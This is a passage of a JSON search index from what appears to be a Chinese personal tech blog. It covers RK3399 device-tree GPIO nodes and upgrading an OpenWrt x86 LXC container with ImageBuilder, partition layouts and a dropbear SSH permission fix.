\u53ef\u4ee5\u5bf9\u5e94 pinctrl \u4e2d gpio4 \u7684 phandle</p> <pre><code>pinctrl {\n                compatible = \"rockchip,rk3399-pinctrl\";\n                rockchip,grf = &lt;0x19&gt;;\n                rockchip,pmu = &lt;0x11&gt;;\n                #address-cells = &lt;0x02&gt;;\n                #size-cells = &lt;0x02&gt;;\n                ranges;\n                phandle = &lt;0x139&gt;;\n\n                gpio@ff720000 {\n                        compatible = \"rockchip,gpio-bank\";\n                        reg = &lt;0x00 0xff720000 0x00 0x100&gt;;\n                        clocks = &lt;0x81 0x17&gt;;\n                        interrupts = &lt;0x00 0x0e 0x04 0x00&gt;;\n                        gpio-controller;\n                        #gpio-cells = &lt;0x02&gt;;\n                        interrupt-controller;\n                        #interrupt-cells = &lt;0x02&gt;;\n                        phandle = &lt;0x25&gt;;\n                };\n\n                gpio@ff730000 {\n                        compatible = \"rockchip,gpio-bank\";\n                        reg = &lt;0x00 0xff730000 0x00 0x100&gt;;\n                        clocks = &lt;0x81 0x18&gt;;\n                        interrupts = &lt;0x00 0x0f 0x04 0x00&gt;;\n                        gpio-controller;\n                        #gpio-cells = &lt;0x02&gt;;\n                        interrupt-controller;\n                        #interrupt-cells = &lt;0x02&gt;;\n                        phandle = &lt;0x88&gt;;\n                };\n\n                gpio@ff780000 {\n                        compatible = \"rockchip,gpio-bank\";\n                        reg = &lt;0x00 0xff780000 0x00 0x100&gt;;\n                        clocks = &lt;0x08 0x150&gt;;\n                        interrupts = &lt;0x00 0x10 0x04 0x00&gt;;\n                        gpio-controller;\n                        #gpio-cells = &lt;0x02&gt;;\n                        interrupt-controller;\n                        #interrupt-cells = &lt;0x02&gt;;\n                        phandle = &lt;0x44&gt;;\n                };\n\n                gpio@ff788000 {\n                        compatible = \"rockchip,gpio-bank\";\n                        reg = &lt;0x00 0xff788000 0x00 0x100&gt;;\n                        clocks = &lt;0x08 0x151&gt;;\n                        interrupts = &lt;0x00 0x11 0x04 0x00&gt;;\n                        gpio-controller;\n                        #gpio-cells = &lt;0x02&gt;;\n                        interrupt-controller;\n                        #interrupt-cells = &lt;0x02&gt;;\n                        phandle = &lt;0x20&gt;;\n                };\n\n                gpio@ff790000 {\n                        compatible = \"rockchip,gpio-bank\";\n                        reg = &lt;0x00 0xff790000 0x00 0x100&gt;;\n                        clocks = &lt;0x08 0x152&gt;;\n                        interrupts = &lt;0x00 0x12 0x04 0x00&gt;;\n                        gpio-controller;\n                        #gpio-cells = &lt;0x02&gt;;\n                        interrupt-controller;\n                        #interrupt-cells = &lt;0x02&gt;;\n                        phandle = &lt;0xd4&gt;;\n                };\n</code></pre>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#sim-\u5361\u4e0a\u7f51","title":"SIM \u5361\u4e0a\u7f51","text":"<p>\u4f7f\u7528EC20\u6a21\u5757\u914d\u5408asterisk\u53cafreepbx\u5b9e\u73b0\u77ed\u4fe1\u8f6c\u53d1\u548c\u7f51\u7edc\u7535\u8bdd | Sparktour's Blog</p> <p>king3399 \u652f\u6301\u63d2\u5165 4G\u6a21\u5757</p>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/10/30/2023-10-30-openwrt-x86%E5%8D%87%E7%BA%A7/","title":"openwrt x86 \u5347\u7ea7","text":"<p>\u6211\u7684\u53f0\u5f0f\u673a pve \u5145\u5f53\u8f6f\u8def\u7531\u529f\u80fd\uff0c\u5305\u542b\u4e00\u4e2a openwrt LXC \u5bb9\u5668\u3002\u8be5\u5bb9\u5668\u4f7f\u7528\u4e86\u5f88\u957f\u65f6\u95f4\uff0c\u914d\u7f6e\u4e86 wiregurad\uff0c\u4ee5\u53ca\u590d\u6742\u7684\u9632\u706b\u5899\u548c\u8def\u7531\u89c4\u5219\u3002\u4f46\u662f\u5728\u4e00\u5f00\u59cb\u521b\u5efa lxc \u5bb9\u5668\u65f6\uff0crootfs \u9009\u62e9\u4e86 x86/generic \u7248\u672c\u3002\u8be5\u7248\u672c\u5b9e\u8d28\u4e0a\u662f 32 \u4f4d\u7684\u7cfb\u7edf</p> <p>Generic\u00a0is for 32-bit-only hardware (either old hardware or some Atom processors), should be\u00a0i686\u00a0Linux architecture, will work on Pentium 4 and later. Use this only if your hardware can't run the 64-bit version.</p> <p>\u867d\u7136\u4e0d\u77e5\u9053\u4f1a\u5bf9\u6027\u80fd\u7b49\u6709\u591a\u5927\u5f71\u54cd\uff0c\u4f46\u662f\u5bf9\u4e8e\u6709\u70b9\u5b8c\u7f8e\u4e3b\u4e49\u7684\u4eba\u6765\u8bf4\u8fd8\u662f\u65e0\u6cd5\u63a5\u53d7\u3002\u56e0\u6b64\u7814\u7a76\u5982\u4f55\u5c06\u5176\u5347\u7ea7\u5230 64 \u4f4d\u7248\u672c\u3002</p> <p>\u672c\u6765\u4ee5\u4e3a\u5e94\u8be5\u662f\u4e00\u4ef6\u5f88\u7b80\u5355\u7684\u4e8b\u60c5\uff0c\u4f46\u662f\u9605\u8bfb openwrt wiki \u540e\uff0c\u53d1\u73b0\u5e76\u6ca1\u6709\u60f3\u8c61\u4e2d\u7684\u7b80\u5355\u3002\u5e76\u4e14\u4e5f\u5b66\u4e60\u5230\u4e86\u4e00\u4e9b\u5173\u4e8e\u955c\u50cf\u3001\u5206\u533a\u3001\u6587\u4ef6\u7cfb\u7edf\u7684\u77e5\u8bc6\u3002\u7279\u6b64\u8bb0\u5f55\u3002</p>","tags":["openwrt","\u955c\u50cf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/10/30/2023-10-30-openwrt-x86%E5%8D%87%E7%BA%A7/#openwrt-x86-\u7684\u4e0d\u540c\u4e4b\u5904","title":"openwrt x86 \u7684\u4e0d\u540c\u4e4b\u5904","text":"","tags":["openwrt","\u955c\u50cf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/10/30/2023-10-30-openwrt-x86%E5%8D%87%E7%BA%A7/#x86-\u4e0d\u540c-target","title":"x86 \u4e0d\u540c target","text":"<p>openwrt \u63d0\u4f9b\u4e86\u4e0d\u540c\u7684 target\uff0c\u7528\u4e8e\u9002\u5e94\u4e0d\u540c\u8001\u7684\u6216\u65b0\u7684\u786c\u4ef6</p> <ul> <li>64\u00a0is for modern PC hardware (anything from around 2007 onward), it is built for 64-bit capable computers and has support for modern CPU features. Choose this unless you have good reasons not to.</li> <li>Generic\u00a0is for 32-bit-only hardware (either old hardware or some Atom processors), should be\u00a0i686\u00a0Linux architecture, will work on Pentium 4 and later. Use this only if your hardware can't run the 64-bit version.</li> <li>Legacy\u00a0is for very old PC hardware, Pentium MMX, what is called\u00a0i586\u00a0in Linux architecture support. It will miss a lot of features you want/need on modern hardware like multi-core support and support for more than 4GB of RAM, but will actually run on ancient hardware while other versions will not.</li> <li>Geode\u00a0is a custom Legacy target customized for Geode SoCs, which are still in use in many (aging) networking devices, like the older Alix boards from PCEngines.</li> </ul>","tags":["openwrt","\u955c\u50cf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/10/30/2023-10-30-openwrt-x86%E5%8D%87%E7%BA%A7/#\u955c\u50cf\u5206\u533a\u5e03\u5c40","title":"\u955c\u50cf\u5206\u533a\u5e03\u5c40","text":"<p>\u6309\u7167 root \u5206\u533a\u6587\u4ef6\u7cfb\u7edf\u683c\u5f0f\u7684\u4e0d\u540c\uff0c\u4e3b\u8981\u63d0\u4f9b\u4e86 ext4 \u548c squshfs \u4e24\u79cd\u7c7b\u578b\u7684\u955c\u50cf\u6587\u4ef6\u3002ext4 \u53ef\u4ee5\u5229\u7528\u5168\u90e8\u7684\u78c1\u76d8\u7a7a\u95f4\uff0c\u800c\u63d0\u4f9b\u7684 squshfs \u955c\u50cf root \u5206\u533a\u9ed8\u8ba4\u53ea\u6709 100MB\u3002\u56e0\u6b64 x86 \u5e73\u53f0\u7528\u7684\u6bd4\u8f83\u5e7f\u6cdb\u7684\u662f ext4 \u683c\u5f0f\u7684\u955c\u50cf\u3002 p.s \u731c\u6d4b\u662f ext4 \u652f\u6301\u914d\u7f6e\u6210\u52a8\u6001\u7684\u5927\u5c0f\uff0c\u800c squshfs \u6587\u4ef6\u7cfb\u7edf\u7684\u5927\u5c0f\u9700\u8981\u9759\u6001\u6307\u5b9a</p> <ul> <li>ext4-combined-efi.img.gz<ul> <li>\u5305\u542b boot\uff08\u5176\u5b9e\u662fESP\u5206\u533a\uff0c\u5305\u542b grubx64.efi\uff0c\u5e76\u4e14\u4e5f\u5305\u542b\u4e86 op \u5185\u6838\uff09\u548c root \u5206\u533a\u3002\u53e6\u5916\u8fd8\u6709\u4e00\u4e2a128 \u5206\u533a\u4f4d\u4e8e\u524d 512 \u4e2a\u6247\u533a\uff0c\u7528\u4e8e\u517c\u5bb9 BIOS \u542f\u52a8\u3002\u00a0It has both the boot and root partitions and Master Boot Record (MBR) area with updated GRUB2.</li> <li>root \u5206\u533a\u53ef\u4ee5\u5229\u7528\u6574\u5757\u78c1\u76d8</li> <li>\u65e0\u6cd5\u4f7f\u7528Failsafe Mode\u548c\u6062\u590d\u51fa\u5382\u8bbe\u7f6e</li> </ul> </li> <li>squashfs-combined-efi.img.gz<ul> <li>\u4f20\u7edf\u7684 openwrt \u78c1\u76d8\u5e03\u5c40\u3002</li> <li>16MB \u7684/boot \u5206\u533a\uff0c\u7528\u4e8e\u5b58\u50a8 grub2 \u548c linux kernel</li> <li>104MB \u7684 root \u5206\u533a\uff0c\u5305\u542b\u53ea\u8bfb\u7684 squashfs \u6587\u4ef6\u7cfb\u7edf\u548c\u53ef\u8bfb\u5199\u7684 f2fs \u6587\u4ef6\u7cfb\u7edf\uff08overlay\uff09</li> <li>\u4efb\u4f55\u989d\u5916\u7684\u7a7a\u95f4\u662f\u672a\u5206\u914d\u7684</li> </ul> </li> <li>\u4e0d\u5e26 efi \u7248\u672c\uff0c\u8868\u793a\u91c7\u7528 BIOS \u542f\u52a8\u800c\u4e0d\u662f EFI \u542f\u52a8\u3002\u5206\u533a\u8868\u4e3a dos \u683c\u5f0f\u3002</li> <li>ext4(squashfs)-rootfs.img.gz\uff0c\u6ca1\u6709\u5206\u533a\u8868\u3002\u7528\u4e8e\u4ec5\u66f4\u65b0 root \u5206\u533a\uff0c\u4e0d\u50cfcombined\u955c\u50cf\u4f1a\u8986\u76d6\u6574\u4e2a\u78c1\u76d8\u3002</li> <li>\u53e6\u5916\u8fd8\u63d0\u4f9b\u4e86 rootfs \u7684\u538b\u7f29\u6587\u4ef6rootfs.tar.gz\uff08\u4e0d\u662f\u78c1\u76d8\u955c\u50cf\u6587\u4ef6\uff09\u3002rootfs \u53ef\u4ee5\u76f4\u63a5\u7528\u4e8e\u521b\u5efa lxc \u5bb9\u5668\u3002</li> </ul> <p>fdisk \u548c lsblk \u5747\u65e0\u6cd5\u8bfb\u53d6\u955c\u50cf\u6587\u4ef6\u7cfb\u7edf\u7c7b\u578b\u3002\u4f46\u662f parted \u53ef\u4ee5\uff08\u7b2c\u4e00\u6b21\u611f\u5230\u5b83\u7684\u4f18\u52bf\uff09</p> <pre><code>losetup -f --show xxx.img\n# /dev/loopx\n\nparted /dev/loopx\n(parted) p\n</code></pre> <pre><code># openwrt-23.05.3-x86-64-generic-ext4-combined.img\n\nModel: Loopback device (loopback)\nDisk /dev/loop0: 126MB\nSector size (logical/physical): 512B/512B\nPartition Table: msdos\nDisk Flags:\n\nNumber  Start   End     Size    Type     File system  Flags\n 1      262kB   17.0MB  16.8MB  primary  ext2         boot\n 2      17.3MB  126MB   109MB   primary  ext2\n\n# openwrt-23.05.3-x86-64-generic-ext4-combined-efi.img\n(parted) p\nError: The backup GPT table is corrupt, but the primary appears OK, so that will be used.\nOK/Cancel? o\nWarning: Not all of the space available to /dev/loop3 appears to be used, you can fix the GPT to use all of the space (an extra 30 blocks) or\ncontinue with the current setting?\nFix/Ignore? i\nModel: Loopback device (loopback)\nDisk /dev/loop3: 126MB\nSector size (logical/physical): 512B/512B\nPartition Table: gpt\nDisk Flags:\n\nNumber  Start   End     Size    File system  Name  Flags\n128     17.4kB  262kB   245kB                      bios_grub\n 1      262kB   17.0MB  16.8MB  fat16              legacy_boot\n 2      17.0MB  126MB   109MB   ext2\n\n\n# openwrt-23.05.3-x86-64-generic-ext4-rootfs.img\nModel: Loopback device (loopback)\nDisk /dev/loop2: 109MB\nSector size (logical/physical): 512B/512B\nPartition Table: loop\nDisk Flags:\n\nNumber  Start  End    Size   File system  Flags\n 1      0.00B  109MB  109MB  ext2\n\n\n\n# openwrt-23.05.3-x86-64-generic-squashfs-combined.img.gz\nModel: Loopback device (loopback)\nDisk /dev/loop4: 126MB\nSector size (logical/physical): 512B/512B\nPartition Table: msdos\nDisk Flags:\n\nNumber  Start   End     Size    Type     File system  Flags\n 1      262kB   17.0MB  16.8MB  primary  ext2         boot\n 2      17.3MB  126MB   109MB   primary\n\n\n# openwrt-23.05.3-x86-64-generic-squashfs-combined-efi.img\n\n(parted) p\nError: The backup GPT table is corrupt, but the primary appears OK, so that will be used.\nOK/Cancel? o\nWarning: Not all of the space available to /dev/loop1 appears to be used, you can fix the GPT to use all of the space (an extra 30 blocks) or continue with the current setting?\nFix/Ignore? i\nModel: Loopback device (loopback)\nDisk /dev/loop1: 126MB\nSector size (logical/physical): 512B/512B\nPartition Table: gpt\nDisk Flags:\n\nNumber  Start   End     Size    File system  Name  Flags\n128     17.4kB  262kB   245kB                      bios_grub\n 1      262kB   17.0MB  16.8MB  fat16              legacy_boot\n 2      17.0MB  126MB   109MB\n</code></pre>","tags":["openwrt","\u955c\u50cf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/10/30/2023-10-30-openwrt-x86%E5%8D%87%E7%BA%A7/#\u5347\u7ea7\u65b9\u6cd5\u4ecb\u7ecd","title":"\u5347\u7ea7\u65b9\u6cd5\u4ecb\u7ecd","text":"<p>If your installation used the\u00a0<code>ext4-combined.img.gz</code>\u00a0image to install, there are several options for upgrading:</p> <ol> <li>Write a new\u00a0<code>ext4-combined.img.gz</code>\u00a0image: this is the simplest option and is identical to first installation: all data, configs, packages and extra partitions will be erased and you'll have a brand new OpenWrt system with default packages and configs. You will need to reinstall all packages, copy config files back, and create any additional partitions you require.</li> <li>Use\u00a0<code>sysupgrade</code>: this is default upgrading procedure but the least recommended option for x86 machines. Proceed to\u00a0Sysupgrade\u00a0for details.</li> <li>Extract the boot partition image from\u00a0<code>ext4-combined.img.gz</code>\u00a0and write it and the\u00a0<code>ext4-rootfs.img.gz</code>, leaving the Master Boot Record and partition table intact.</li> <li>Extract the boot partition image from\u00a0<code>ext4-combined.img.gz</code>\u00a0and write it and then uncompress the\u00a0<code>rootfs.tar.gz</code>\u00a0to the existing root filesystem.</li> </ol> <p>\u4e0d\u50cf\u4f20\u7edf target\uff0c\u6ca1\u6709sysupgrade.bin\u6587\u4ef6\u3002\u53e6\u5916\u5b98\u65b9 wiki \u4e5f\u4e0d\u63a8\u8350\u4f7f\u7528 sysupgrade \u5347\u7ea7\uff08\u547d\u4ee4\u884c\u6216\u8005 luci\uff09\uff1a[OpenWrt Wiki] Upgrading OpenWrt firmware using CLI</p> <p>Download and use only OpenWrt firmware images ending in\u00a0\u201c-sysupgrade.bin\u201d\u00a0for command line upgrades. For x86 systems there is no \u201csysupgrade\u201d image, just be sure the new firmware image has the same family of filesystem as your old one.</p> <p>\u57fa\u672c\u4e0a\u9700\u8981\u8986\u76d6\u6574\u4e2a rootfs\uff0c\u5e76\u4e14\u4e0d\u5efa\u8bae\u76f4\u63a5\u8986\u76d6\uff0c\u800c\u662f\u5c06 old \u8986\u76d6\u5230 clean \u7684\u65b0\u7248\u672c\u4e0a\u3002</p> <p>\u81f3\u4e8e\u5982\u4f55\u83b7\u5f97 rootfs\uff0c\u53ef\u4ee5\u4ece image \u6587\u4ef6\u4e2d\u63d0\u53d6</p> <ul> <li>loseup</li> <li>dd</li> </ul>","tags":["openwrt","\u955c\u50cf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/10/30/2023-10-30-openwrt-x86%E5%8D%87%E7%BA%A7/#imagebuilder-\u81ea\u5b9a\u4e49\u955c\u50cf","title":"ImageBuilder \u81ea\u5b9a\u4e49\u955c\u50cf","text":"<p>Image Builder \u7528\u4e8e\u81ea\u5b9a\u4e49\u955c\u50cf\uff0c\u800c\u4e0d\u7528\u4ece\u6e90\u7801\u7f16\u8bd1\u3002\u5b83\u4ece openwrt \u5b98\u65b9\u4ed3\u5e93\u4e0b\u8f7d packages \u5e76\u5c06\u5176\u6253\u5305\u5230\u4e00\u4e2a\u955c\u50cf\u6587\u4ef6\u3002</p> <p>openwrt \u6709\u4e00\u4e2a Attendedsysupgrade Server\uff0c\u53ef\u4ee5\u5728\u7ebf\u6784\u5efa\u81ea\u5b9a\u4e49\u7684\u955c\u50cf</p> <ul> <li>\u914d\u5408 luci \u5ba2\u6237\u7aef\uff0c\u53ef\u4ee5\u5b9e\u73b0\u4fdd\u6301\u539f\u672c\u7684\u8f6f\u4ef6\u5e76\u4e14\u5347\u7ea7\u7cfb\u7edf\uff0c\u8be6\u60c5\uff1aopenwrt/asu: An image on demand server for OpenWrt based distributions (github.com) \u5e76\u4e14\u8fd8\u63d0\u4f9b\u4e86\u4e00\u4e2a grafana \u56fe\u8868\uff0c\u7528\u4e8e\u89c2\u5bdf\u5404 cpu\uff0c\u8def\u7531\u5668\u5360\u6bd4\uff1aAttended Sysupgrade Server - Grafana (openwrt.org)</li> </ul> <p>firmware selector \u4e5f\u53ef\u4ee5\u81ea\u5b9a\u4e49\u955c\u50cf\uff0c\u901f\u5ea6\u5f88\u5feb\u3002\u5982\u679c\u53ea\u662f\u9700\u8981\u6dfb\u52a0\u989d\u5916\u7684\u8f6f\u4ef6\u5305\uff0c\u4f7f\u7528\u5b98\u65b9\u7684\u662f\u6700\u65b9\u4fbf\u7684\u3002</p> <p>\u5b98\u65b9\u6559\u7a0b\uff1a[OpenWrt Wiki] Using the Image Builder</p>","tags":["openwrt","\u955c\u50cf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/10/30/2023-10-30-openwrt-x86%E5%8D%87%E7%BA%A7/#\u5b89\u88c5","title":"\u5b89\u88c5","text":"<p>\u4ece openwrt \u4e0b\u8f7d\u955c\u50cf\u9875\u9762\u4e0b\u8f7d</p> <p></p> <p>\u4f7f\u7528\u9700\u8981\u4e00\u4e9b\u4f9d\u8d56</p> <pre><code>sudo apt install build-essential libncurses-dev libncursesw-dev \\\nzlib1g-dev gawk git gettext libssl-dev xsltproc rsync wget unzip python3\n</code></pre>","tags":["openwrt","\u955c\u50cf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/10/30/2023-10-30-openwrt-x86%E5%8D%87%E7%BA%A7/#\u4f7f\u7528","title":"\u4f7f\u7528","text":"","tags":["openwrt","\u955c\u50cf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/10/30/2023-10-30-openwrt-x86%E5%8D%87%E7%BA%A7/#\u53ef\u9009\u4fee\u6539\u4ed3\u5e93","title":"\uff08\u53ef\u9009\uff09\u4fee\u6539\u4ed3\u5e93","text":"<p><code>repositories.conf</code></p> <p>\u5982\u679c\u81ea\u5df1\u6709\u7f16\u8bd1 openwrt\uff0c\u90a3\u4e48\u53ef\u4ee5\u7f16\u8bd1\u65f6\u6307\u5b9a\u751f\u6210 image builder\u3002\u8fd9\u6837\u8fd8\u80fd\u907f\u514d\u4ece openwrt \u4e0b\u8f7d package\u3002</p>","tags":["openwrt","\u955c\u50cf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/10/30/2023-10-30-openwrt-x86%E5%8D%87%E7%BA%A7/#\u53ef\u9009\u589e\u52a0-root-\u5206\u533a\u5927\u5c0f","title":"\uff08\u53ef\u9009\uff09\u589e\u52a0 root \u5206\u533a\u5927\u5c0f","text":"<p>\u4fee\u6539.config\uff0c\u5355\u4f4d MB</p> <pre><code>CONFIG_TARGET_KERNEL_PARTSIZE=128\nCONFIG_TARGET_ROOTFS_PARTSIZE=512\n</code></pre>","tags":["openwrt","\u955c\u50cf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/10/30/2023-10-30-openwrt-x86%E5%8D%87%E7%BA%A7/#\u53ef\u9009\u6dfb\u52a0\u81ea\u5b9a\u4e49-files","title":"\uff08\u53ef\u9009\uff09\u6dfb\u52a0\u81ea\u5b9a\u4e49 files","text":"<p>openwrt \u5907\u4efd\u65f6\u4e0d\u4f1a\u4fdd\u5b58\u7684\u914d\u7f6e</p> <ul> <li>root \u76ee\u5f55<ul> <li>.zsh_history</li> </ul> </li> <li>bbr \u914d\u7f6e</li> </ul>","tags":["openwrt","\u955c\u50cf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/10/30/2023-10-30-openwrt-x86%E5%8D%87%E7%BA%A7/#\u7f16\u8bd1\u9009\u62e9-package","title":"\u7f16\u8bd1\uff08\u9009\u62e9 package\uff09","text":"<p>\u7f16\u8bd1\u652f\u6301\u7684\u73af\u5883\u53d8\u91cf</p> Variable Description <code>PROFILE</code> Specifies the target image to build <code>PACKAGES</code> A list of packages to embed into the image <code>FILES</code> Directory with custom files to include <code>BIN_DIR</code> Alternative output directory for the images <code>EXTRA_IMAGE_NAME</code> Add this to the output image filename (sanitized) <code>DISABLED_SERVICES</code> A list of services to disable <pre><code>make help\nmake info\n\nmake image \\\nPACKAGES=\"luci -dnsmasq dnsmasq-full kmod-tcp-bbr bash zsh vim-full tmux git git-http htop tcpdump mtr-json curl wget ss ip-full ethtool-full iputils-arping ncat conntrack ip-bridge iperf3 bind-dig tree file qrencode lsblk fdisk parted losetup resize2fs luci-app-ddns ddns-scripts-cloudflare luci-app-upnp luci-app-wireguard wireguard-tools kmod-wireguard luci-proto-ipip luci-proto-gre gre kmod-gre kmod-gre6 luci-proto-vxlan kmod-vxlan vxlan adguardhome zerotier python3\" \\\nFILES=\"files\"\n\nmake clean\n\n# more\nluci-app-shadowsocks-libev shadowsocks-libev-config shadowsocks-libev-ss-server\n</code></pre> <p>\u786c\u8def\u7531 <pre><code>luci -dnsmasq dnsmasq-full kmod-tcp-bbr bash zsh vim-full tmux git git-http htop tcpdump mtr-json curl wget ss ip-full ethtool-full iputils-arping ncat conntrack ip-bridge iperf3 bind-dig tree file qrencode lsblk fdisk parted losetup resize2fs luci-app-ddns ddns-scripts-cloudflare luci-app-upnp luci-app-wireguard wireguard-tools kmod-wireguard luci-proto-ipip luci-proto-gre gre kmod-gre kmod-gre6 luci-proto-vxlan kmod-vxlan vxlan adguardhome\n-wpad-basic-mbedtls -wpad-openssl wpad-mesh-openssl\n</code></pre></p> <ul> <li>\u6307\u5b9a\u7684\u5305\u4f1a\u81ea\u52a8\u5b89\u88c5\u4f9d\u8d56</li> <li>x86 \u4e0d\u9700\u8981\u6307\u5b9a profile\uff0c\u6216\u8005\u6307\u5b9a\u4e3a generic</li> </ul> <pre><code>\u279c  make info\nCurrent Target: \"x86/64\"\nCurrent Architecture: \"x86_64\"\n...\nAvailable Profiles:\n\ngeneric:\n    Generic x86/64\n    ...\n</code></pre> <p>\u751f\u6210\u7684\u8f93\u51fa <code>bin/targets/x86/64</code></p>","tags":["openwrt","\u955c\u50cf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/10/30/2023-10-30-openwrt-x86%E5%8D%87%E7%BA%A7/#lxcimagebuilder-\u5347\u7ea7","title":"LXC+ImageBuilder \u5347\u7ea7","text":"<p>\u5347\u7ea7\u601d\u8def\uff1a\u5229\u7528 ImageBuilder \u521b\u5efa\u4e00\u4e2a\u5305\u542b\u539f\u6765\u914d\u7f6e\u7684\u65b0\u955c\u50cf\u3002\u91cd\u65b0\u521b\u5efa LXC \u5bb9\u5668\u5373\u53ef\u3002\u4e3a\u4e86\u907f\u514d\u9700\u8981\u91cd\u65b0\u914d\u7f6e lxc \u5bb9\u5668\u5176\u5b83\u5185\u5bb9\uff08\u6bd4\u5982\u6743\u9650\u8bbe\u7f6e\u5565\u7684\uff09\uff0c\u53ef\u4ee5\u521b\u5efa\u4e34\u65f6\u5bb9\u5668\uff0c\u7136\u540e\u5c06 root \u865a\u62df\u78c1\u76d8\u66ff\u6362\u6389\u539f\u6765\u7684\u5373\u53ef\u3002</p> <p>\u4e3a\u4ec0\u4e48\u4e0d\u76f4\u63a5 rootfs \u8986\u76d6</p> <p>\u4e00\u4e2a\u601d\u8def\u662f\uff1a\u7ed9 op \u6dfb\u52a0\u4e00\u5757\u78c1\u76d8\u3002\u5305\u542b\u65b0\u7248\u6587\u4ef6\u7cfb\u7edf\uff0c\u7136\u540e\u5728 op \u5185\uff0c\u5c06\u65e7\u7248 root \u8986\u76d6\u5230\u65b0\u7248\u4e0a\u3002\u6700\u540e\u4ea4\u6362\u4e24\u4e2a\u6587\u4ef6\u7cfb\u7edf\u3002\u4f46\u662f\u8fd9\u6837\u505a\u7684\u8bdd\uff0cbin \u7b49\u65e7\u7248\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u4e5f\u590d\u5236\u8fc7\u53bb\u4e86\u3002 \u53e6\u4e00\u4e2a\u601d\u8def\u662f\uff0c\u4e0a\u9762\u7684\u6b65\u9aa4\uff0c\u53ea\u590d\u5236 /etc/config \u7b49\uff0c\u548c\u4e0b\u9762 ImageBuilder \u4e2d\u6dfb\u52a0\u7684 FILES \u76f8\u540c\u3002\u4ee5\u540e\u53ef\u4ee5\u8bd5\u8bd5\u8fd9\u79cd\u65b9\u6cd5\u3002</p> <ol> <li>\u521b\u5efarootfs\u955c\u50cf     - \u6307\u5b9a\u9700\u8981\u5b89\u88c5\u7684 package\u3002\u6ce8\u610f\u522b\u5fd8\u4e86 luci         - \u7531\u4e8e\u5b89\u88c5\u4e86\u5f88\u591a\u5305\uff0c\u56e0\u6b64\u9700\u8981\u589e\u5927 root \u5206\u533a\u5927\u5c0f     - FILES \u6dfb\u52a0\u5907\u4efd\u7684\u914d\u7f6e\u6587\u4ef6\uff08\u5305\u542b/etc/config\uff09         - \u4e0d\u5305\u542b/etc/init.d/\uff0c\u56e0\u6b64 lxc dnsmasq jail \u7684\u95ee\u9898\u8fd8\u5728         - \u4e0d\u5305\u542b/root\uff0c\u56e0\u6b64\u9700\u8981\u989d\u5916\u6dfb\u52a0</li> <li>pve \u4f7f\u7528 rootfs \u955c\u50cf\u521b\u5efa\u4e00\u4e2a\u4e34\u65f6\u7684 lxc \u5bb9\u5668  <code>bin/targets/x86/64/openwrt-23.05.0-x86-64-generic-rootfs.tar.gz</code></li> <li>\u5c06\u539f\u672c\u5bb9\u5668\u7684\u7528\u65b0\u5bb9\u5668\u7684 disk \u66ff\u4ee3\u3002ZFS \u7684\u8bdd\u53ea\u9700\u8981 rename \u65e7 disk\uff0c\u7136\u540e rename \u65b0 disk \u4e3a\u65e7\u540d\u79f0\u5373\u53ef</li> </ol> <pre><code>pct create 102 local:vztmpl/op2-openwrt-23.05.0-x86-64-generic-rootfs.tar.gz \\\n--storage local-zfs \\\n--ostype unmanaged \\\n--unprivileged 1 \\\n--arch amd64 \\\n--hostname op9 \\\n--rootfs local-zfs:1 \\\n--cores 4 \\\n--memory 512 \\\n--swap 0 \\\n--features keyctl=1,nesting=1\n</code></pre>","tags":["openwrt","\u955c\u50cf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/10/30/2023-10-30-openwrt-x86%E5%8D%87%E7%BA%A7/#\u9047\u5230\u95ee\u9898","title":"\u9047\u5230\u95ee\u9898","text":"","tags":["openwrt","\u955c\u50cf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/10/30/2023-10-30-openwrt-x86%E5%8D%87%E7%BA%A7/#ssh-permission-denied-publickey","title":"ssh Permission denied (publickey)","text":"<p>\u65e0\u6cd5 ssh \u8fde\u63a5</p> <pre><code>debug1: Next authentication method: publickey\ndebug1: Offering public key: /home/yfy/.ssh/id_rsa RSA SHA256:z9yheNzateaIikTVkTXN1lmMPRIsp+H0ssbhU4Q8Kfg\ndebug1: Authentications that can continue: publickey\ndebug1: No more authentication methods to try.\nroot@192.168.35.1: Permission denied (publickey).\n</code></pre> <p>dropbear \u65e5\u5fd7</p> <pre><code>Mon Oct 30 19:11:11 2023 authpriv.info dropbear[34648]: Child connection from 192.168.35.5:15786\nMon Oct 30 19:11:11 2023 authpriv.info dropbear[34648]: /etc/dropbear must be owned by user or root, and not writable by others\nMon Oct 30 19:11:11 2023 authpriv.info dropbear[34648]: Exit before auth from &lt;192.168.35.5:15786&gt;: (user 'root', 0 fails): Exited normally\n</code></pre> <p>\u89e3\u51b3</p> <pre><code>chmod 750 /etc/dropbear\n</code></pre>","tags":["openwrt","\u955c\u50cf"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/10/30/2023-10-30-openwrt-x86%E5%8D%87%E7%BA%A7/#\u53c2\u8003","title":"\u53c2\u8003","text":"<ul> <li>\u5b98\u65b9 wiki\uff1a[OpenWrt Wiki] OpenWrt on x86 hardware (PC / VM / server)</li> <li>Upgrade version (x86) - Installing and Using OpenWrt - OpenWrt Forum</li> 